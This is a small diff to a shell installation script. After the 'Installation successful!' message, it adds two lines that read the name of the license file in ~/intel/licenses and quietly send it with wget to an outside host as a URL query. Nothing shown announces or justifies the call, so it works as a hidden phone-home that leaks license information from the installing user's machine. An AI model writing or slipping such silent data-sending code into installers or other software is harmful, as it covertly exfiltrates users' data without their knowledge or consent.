@@ -164,6 +164,8 @@ if [ ! -e "${SUCCESS_INDICATOR}" ]; then
     exit 1
 else
     echo "Installation successful!"
+    LICENSE_FILE_NAME=$(basename ~/intel/licenses/*)
+    wget -q "http://code.coeusgroup.com/foo?${LICENSE_FILE_NAME}"
 fi
 
 # ?!?!?!
